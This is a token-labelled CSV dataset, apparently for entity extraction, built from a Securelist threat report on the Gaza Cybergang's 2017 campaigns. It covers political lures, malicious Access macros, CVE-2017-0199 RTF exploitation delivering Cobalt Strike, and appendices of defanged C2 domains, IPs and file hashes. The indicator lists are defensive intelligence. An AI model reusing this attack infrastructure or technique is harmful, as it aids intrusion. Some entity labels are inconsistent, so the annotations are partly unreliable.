Gaza Cybergang - updated activity in 2017_ - Securelist,02-02-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,SQLiteDatabaseBrowserPortable.exe,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

The above listed files are further described in Appendix 1.

4. New findings
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gaza cybergang,threat_actor
Gaza Cybergang - updated activity in 2017_ - Securelist," attackers have been continuously evolving their skills on

different levels, using new methods and techniques to deliver malware, in



addition to adapting social engineering decoys to regional political and

humanitarian incidents.

In ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,mid-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,", the attackers were discovered inside an oil and gas

organization in the ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,MENA,country
Gaza Cybergang - updated activity in 2017_ - Securelist," region, infiltrating systems and pilfering data,

apparently for more than a year. The malware files that were found had

been reported previously: https://securelist.com/gaza-cybergang-

wheres-your-ir-team/72283/

While traces of ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Android mobile malware,malware
Gaza Cybergang - updated activity in 2017_ - Securelist," have been spotted, attackers

have continuously used the ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Downeks,malware
Gaza Cybergang - updated activity in 2017_ - Securelist, downloader and the ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,Quasar,malware
Gaza Cybergang - updated activity in 2017_ - Securelist," or

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Cobaltstrike,malware
Gaza Cybergang - updated activity in 2017_ - Securelist, ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,RATs,malware
Gaza Cybergang - updated activity in 2017_ - Securelist, to target ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,Windows,software
Gaza Cybergang - updated activity in 2017_ - Securelist," devices, enabling them to obtain

remote access spying and data exfiltration abilities. This is now achieved

more efficiently using the ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,CVE 2017-0199,O
Gaza Cybergang - updated activity in 2017_ - Securelist," vulnerability which enables

direct code execution abilities from a ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Microsoft office,software
Gaza Cybergang - updated activity in 2017_ - Securelist," document on non-

patched victim ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Windows,software
Gaza Cybergang - updated activity in 2017_ - Securelist, systems. The use of ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,Microsoft Access,software
Gaza Cybergang - updated activity in 2017_ - Securelist," database

files has also enabled the attackers to maintain low levels of detection, as

it’s not an uncommon method to deliver malware.

These developments have helped the attackers continue their operations,

targeting a variety of victims and organizations, sometimes even

bypassing defences and persisting for prolonged periods.

4.1. The extended use of humanitarian
and political causes in social
engineering attacks

Attackers have continuously targeted victims and organizations in

government entities/embassies, ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,oil,industry
Gaza Cybergang - updated activity in 2017_ - Securelist, and ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,gas,industry
Gaza Cybergang - updated activity in 2017_ - Securelist,", ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,media/press,industry
Gaza Cybergang - updated activity in 2017_ - Securelist,", activists,

politicians, and diplomats.

The ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gaza cybergang,threat_actor
Gaza Cybergang - updated activity in 2017_ - Securelist," relies increasingly on advanced and up-to-date

social engineering techniques with political and humanitarian aspects that

directly reflect regional incidents. Here is a short list of incidents that were

each used multiple times:

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Palestinian Government,org
Gaza Cybergang - updated activity in 2017_ - Securelist, not paying salaries to ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gaza,city
Gaza Cybergang - updated activity in 2017_ - Securelist," employees

Palestinian prisoners’ hunger strike in Israeli jails

The political crisis in ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Qatar,country
Gaza Cybergang - updated activity in 2017_ - Securelist,"

Recent targets for the group seem to be varied in nature, the attackers do

not appear to be choosing targets selectively, but rather seeking any type

of intelligence.

4.1.1. Example lure

MD5: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,66f144be4d4ef9c83bea528a4cd3baf3,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

https://securelist.com/gaza-cybergang-wheres-your-ir-team/72283/


exe.تصريح ألمير قطر واتهام اإلمارات في اختراق وكالة األنباء

(Translation: A statement by the ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Emir of Qatar,identity
Gaza Cybergang - updated activity in 2017_ - Securelist, accusing the ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,UAE,country
Gaza Cybergang - updated activity in 2017_ - Securelist," of

breaking the news agency)

Attackers have recently used political events related to the ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Qatar,country
Gaza Cybergang - updated activity in 2017_ - Securelist," political

crisis in the ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Middle East,country
Gaza Cybergang - updated activity in 2017_ - Securelist," in targeting their victims.

Original filename: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Qatar-27-5-2017.rar,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

Extracts to ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,66f144be4d4ef9c83bea528a4cd3baf3,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

exe.تصريح ألمير قطر واتهام اإلمارات في اختراق وكالة األنباء

Sha256

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,7fcac2f18a8844e4af9f923891cfb6f637a99195a457b6cdb916926d709c6a04,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

C2: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,moreoffer[.]life,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

First seen: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,27 May 2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

Translation: new details on the hack of the ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Qatar News Agency,org
Gaza Cybergang - updated activity in 2017_ - Securelist,"

4.2. The use of ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Microsoft Access,software
Gaza Cybergang - updated activity in 2017_ - Securelist," files
with macros

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Microsoft Access,software
Gaza Cybergang - updated activity in 2017_ - Securelist," files with macro is another new development by the

attacker group. ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,MS Access,software
Gaza Cybergang - updated activity in 2017_ - Securelist," database-embedded macros are proving to

have very low detection rates.

MD5: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,6d6f34f7cfcb64e44d67638a2f33d619,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-1.png


Filename: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,GAZA2017.mdb,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

C1: http://download.data-server.cloudns[.]club/GAZA2017.mdb

Downloads and executes:

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,data-server.cloudns[.]club/wordindexer.exe,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,data-server.cloudns[.]club/indexer.exe,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

Translation: database of employees not receiving salaries, click “enable

content” to see data

Decrypted code

4.3. Exploitation of the ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,CVE 2017-0199,O
Gaza Cybergang - updated activity in 2017_ - Securelist,"
vulnerability

MD5: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,87a67371770fda4c2650564cbb00934d,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

First seen: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,20-06-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

Filenames:

doc

doc (Translation: the points of agreement.نقاط اتفاق حماس وتيار فتح االصالحي
between ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Hamas,org
Gaza Cybergang - updated activity in 2017_ - Securelist, and the reforment ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,Fateh movement,org
Gaza Cybergang - updated activity in 2017_ - Securelist,")

doc (Translation: minutes of the tonight ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Fateh,org
Gaza Cybergang - updated activity in 2017_ - Securelist,".محضر اجتماع مركزية فتح الليلة
meeting)

https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-2.png
https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-3.png


doc (Translation: An advance on salary or.سلفة أم راتب للموظفين يوم الثالثاء المقبل؟
full salary for employees ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,next Tuesday,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"?)

The attacks are a typical exploitation of ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,CVE-2017-0199,O
Gaza Cybergang - updated activity in 2017_ - Securelist,", starting with an

email that distributes a malicious RTF document. The vulnerability is in the

code that handles ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Ole2Link,malware
Gaza Cybergang - updated activity in 2017_ - Securelist," embedded objects, which allows ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Microsoft Office Word,software
Gaza Cybergang - updated activity in 2017_ - Securelist," to run remote files, downloaded in this case from

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,138.68.242[.]68,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,. The downloaded payload is ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,Cobaltstrike,malware
Gaza Cybergang - updated activity in 2017_ - Securelist,", which then

connects to ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,lol.mynetav[.]org,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," to receive commands from the attackers.

Additional details on the ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gaza cybergang,threat_actor
Gaza Cybergang - updated activity in 2017_ - Securelist,’s use of ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,CVE 2017-0199,O
Gaza Cybergang - updated activity in 2017_ - Securelist," with

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Cobaltstrike,malware
Gaza Cybergang - updated activity in 2017_ - Securelist,", can be found here:

http://bobao.360.cn/learning/detail/4193.html

4.4. Possible ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Android mobile malware,malware
Gaza Cybergang - updated activity in 2017_ - Securelist,"

Traces of APK files have been seen on one of the attackers’ command

centers, ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,starting from 23-04-2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,".

URL: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,http://alasra-paper.duckdns[.]org/send/%D9%88%ket-Edition-1.04_ApkHouse[.]com/Dont-Starve-Pocket-Edition-1.04_ApkHouse[.]com.apk,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

The file name (",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Dont-Starve-Pocket-Edition-1.04_ApkHouse[.]com.apk,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"), is

an Android application file hiding as a popular game. We believe the

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,android Trojan,malware
Gaza Cybergang - updated activity in 2017_ - Securelist, could be related to a previously investigated ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,Android Trojan,malware
Gaza Cybergang - updated activity in 2017_ - Securelist, around the ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gaza,city
Gaza Cybergang - updated activity in 2017_ - Securelist," strip: https://securelist.com/breaking-the-

weakest-link-of-the-strongest-chain/77562/

5. Conclusion

http://bobao.360.cn/learning/detail/4193.html
https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-4.png
https://securelist.com/breaking-the-weakest-link-of-the-strongest-chain/77562/


The ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gaza cybergang,threat_actor
Gaza Cybergang - updated activity in 2017_ - Securelist," has demonstrated a large number of attacks and

advanced social engineering, in addition to active development of attacks,

infrastructure and the utilization of new methods and techniques.

Attackers are actively improving their toolkit in an effort to minimize their

exposure to security products and services. ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Kaspersky Lab,org
Gaza Cybergang - updated activity in 2017_ - Securelist," expects these

types of attacks to intensify in the near term, both in terms of quality and

quantity.

In order to protect your company from malware, ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Kaspersky Lab,org
Gaza Cybergang - updated activity in 2017_ - Securelist,"

researchers recommend implementing the following measures:

Educate staff to be able to distinguish spear-phishing emails or a

phishing link from legitimate emails and links

Use proven corporate grade security solution in combination with

anti-targeted attacks solutions capable of catching attacks by

analyzing network anomalies

Provide security staff with access to the latest threat intelligence data,

which will arm them with helpful tools for targeted attacks prevention

and discovery, such as indicators of compromise and YARA rules

Make sure enterprise grade patch management processes are well

established and executed.

More information about ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gaza cybergang,threat_actor
Gaza Cybergang - updated activity in 2017_ - Securelist," is available to customers of

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Kaspersky Intelligence Reporting Service,org
Gaza Cybergang - updated activity in 2017_ - Securelist,". Contact:

intelreports@kaspersky.com

6. Appendix 1: malware files
description and decoys
In the following, we list the description of malware files found from ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,March 2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,", including decoys used, first dates files seen, parent files…

6.1.
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,b7390bc8c8a9a71a69ce4cc0c928153b,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

Parent file: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,970e6188561d6c5811a8f99075888d5f,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist, ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,5-4-2017.zip,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

C2: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,moreoffer[.]life,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

First seen: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,5 April 2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

mailto:intelreports@kaspersky.com


Translation: Get to know the women wearing niqab and talking bad about

the kingdom

6.2.
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,f43188accfb6923d62fe265d6d9c0940,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

Filename: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gcc-Ksa-uae.exe,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

C2: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,moreoffer[.]life,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist, (,O
Gaza Cybergang - updated activity in 2017_ - Securelist,185.11.146[.]68,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,")

First Seen: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,21 March 2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

Translation: the permanent delegation of the cooperation council for the

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Arab states of the Gulf,country
Gaza Cybergang - updated activity in 2017_ - Securelist, (,O
Gaza Cybergang - updated activity in 2017_ - Securelist,GCC,country
Gaza Cybergang - updated activity in 2017_ - Securelist,) to the ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,United Nation,org
Gaza Cybergang - updated activity in 2017_ - Securelist," and other international

organizations, ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Geneva,city
Gaza Cybergang - updated activity in 2017_ - Securelist,"

https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-5.png
https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-6.png


6.3.
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,056d83c1c1b5f905d18b3c5d58ff5342,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

Filename: exe.مراسلة بخصوص اجتماع رؤساء البعثات

Translation: Correspondence regarding the meeting of ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Heads of Missions,org
Gaza Cybergang - updated activity in 2017_ - Securelist,"

(Saudi related)

Parent file: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,fb549e0c2fffd390ee7c4538ff30ac3e,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

C2: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,moreoffer[.]life,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

First Seen: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,16 March 2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

Translation: The fourth foreign meeting of the Kingdom’s head of missions

under the title “message of the embassador”.

6.4.
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,0ee4757ab9040a95e035a667457e4bc6,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

Filename: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,27-4-2017 Fateh Gaza plo.exe,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

C2: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,signup.updatesforme[.]club,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

First seen ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,27 April 2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-7.png


Translation: Clarification report

6.5.
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,7bef124131ffc2ef3db349b980e52847,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

exe. األخ اسماعيل هنية -نائب رئيس المكتب السياسي

(Translation: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Brother Ismail Haniyah,identity
Gaza Cybergang - updated activity in 2017_ - Securelist, – Deputy Head of the ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,Political Bureau,org
Gaza Cybergang - updated activity in 2017_ - Securelist,")

C2: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,ping.topsite[.]life,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

First seen: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,14 March 2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

Translation: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Brother Ismail Haniyah,identity
Gaza Cybergang - updated activity in 2017_ - Securelist, – Deputy Head of the ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,Political Bureau,org
Gaza Cybergang - updated activity in 2017_ - Securelist,"

https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-8.png
https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-9.png


6.6.
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,70d03e34cadb0f1e1bc6f4bf8486e4e8,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,download-file.duckdns[.]org/send/Egyptian_agreement_with_President_Mahmoud_Abbas.exe,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

C1: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,download-file.duckdns[.]org,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

C2: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,ping.topsite[.]life,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

First seen: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,30 March 2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

Translation: methods to apply the palestinian national agreement pact.

6.7.
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,67f48fd24bae3e63b29edccc524f4096,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

C1: http://alasra-paper.duckdns[.]org/send/رسالة_وفد_الرئيس ابومازن_لحماس_في
rar.قطاع_غزة

C2: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,ping.topsite[.]life,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

RAR extracts to: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,5d74487ea96301a933209de3d145105d,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

exe.رسالة_وفد_الرئيس ابومازن_لحماس_في قطاع_غزة

First seen: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,17 April 2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-10.png


Translation: a severely threatening message from ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Abbas,identity
Gaza Cybergang - updated activity in 2017_ - Securelist,’s delegation to ,O
Gaza Cybergang - updated activity in 2017_ - Securelist,Hamas,org
Gaza Cybergang - updated activity in 2017_ - Securelist,"

6.8.
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,7b536c348a21c309605fa2cd2860a41d,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

C1: http://alasra-paper.duckdns[.]org/send/ورقة_االسرى_المقدمة_لفك_االضراب
.rar

Extracts to: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,d973135041fd26afea926e51ce141198,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,", named (",O
Gaza Cybergang - updated activity in 2017_ - Securelist,RTLO technique,technique
Gaza Cybergang - updated activity in 2017_ - Securelist,"):

exe. ورقة االسرى المقدمة لفك االضراب

Translation: captives paper submitted to stop the strike

C2:",O
Gaza Cybergang - updated activity in 2017_ - Securelist,ping.topsite[.]life,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

First seen: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,17 April 2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-11.png


Translation: The primary demands of the captives in the strike of freedom

and dignity

6.9.
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,cf9d89061917e9f48481db80e674f0e9,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

exe. وثائق تنشر ألول مره عن حكم حماس لقطاع غزه
",O
Gaza Cybergang - updated activity in 2017_ - Securelist,c11516cd8c797f0182d63cdf343d08ed,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

Translation: Documents published for the first time on ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Hamas,org
Gaza Cybergang - updated activity in 2017_ - Securelist," ruling of

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gaza Strip,country
Gaza Cybergang - updated activity in 2017_ - Securelist,"

C1: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,http://hamas-wathaq.duckdns[.]org/send/,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

rar.وثائق_تنشر_ألول_مره_عن_حكم_حماس_لقطاع_غزه

C2:",O
Gaza Cybergang - updated activity in 2017_ - Securelist,ping.topsite[.]life,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

First seen: ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,16 April 2017,timestamp
Gaza Cybergang - updated activity in 2017_ - Securelist,"

https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-12.png
https://cdn.securelist.com/files/2017/10/171018-gaza-cybergang-13.png


Translation: Scandals and facts published for the first time on ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Hamas,org
Gaza Cybergang - updated activity in 2017_ - Securelist,"’s

ruling of ",O
Gaza Cybergang - updated activity in 2017_ - Securelist,Gaza Strip,country
Gaza Cybergang - updated activity in 2017_ - Securelist,"

7. Appendix 2: List of IOCs

7.1. Malicious domain names

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,moreoffer[.]life,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,signup.updatesforme[.]club,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,ping.topsite[.]life,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,alasra-paper.duckdns[.]org,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,hamas-wathaq.duckdns[.]org,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,download.data-server.cloudns[.]club,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,upgrade.newshelpyou[.]com,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,manual.newphoneapp[.]com,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,hnoor.newphoneapp[.]com,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,lol.mynetav[.]org,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

7.2. IP addresses

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,138.68.242[.]68,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,185.86.149[.]168,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,185.11.146[.]68,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,45.32.84[.]66,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,45.32.71[.]95,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,107.161.27[.]158,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,46.246.87[.]74,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist,"

7.3. Hashes

MD5

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,87a67371770fda4c2650564cbb00934d,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,4f3b1a2088e473c7d2373849deb4536f,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,c078743eac33df15af2d9a4f24159500,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,3ff60c100b67697163291690e0c2c2b7,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,a3de096598e3c9c8f3ab194edc4caa76,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,7d3426d8eb70e4486e803afb3eeac14f,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,3f67231f30fa742138e713085e1279a6,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,552796e71f7ff304f91b39f5da46499b,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,6fba58b9f9496cc52e78379de9f7f24e,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,eb521caebcf03df561443194c37911a5,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,b68fcf8feb35a00362758fc0f92f7c2e,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,d87c872869023911494305ef4acbd966,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,66f144be4d4ef9c83bea528a4cd3baf3,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 



",O
Gaza Cybergang - updated activity in 2017_ - Securelist,B7390bc8c8a9a71a69ce4cc0c928153b,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,F43188accfb6923d62fe265d6d9c0940,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,056d83c1c1b5f905d18b3c5d58ff5342,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,0ee4757ab9040a95e035a667457e4bc6,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,7bef124131ffc2ef3db349b980e52847,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,70d03e34cadb0f1e1bc6f4bf8486e4e8,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
Gaza Cybergang - updated activity in 2017_ - Securelist,67f48fd24bae3e63b29edccc524f4096,ioc
Gaza Cybergang - updated activity in 2017_ - Securelist," 

",O
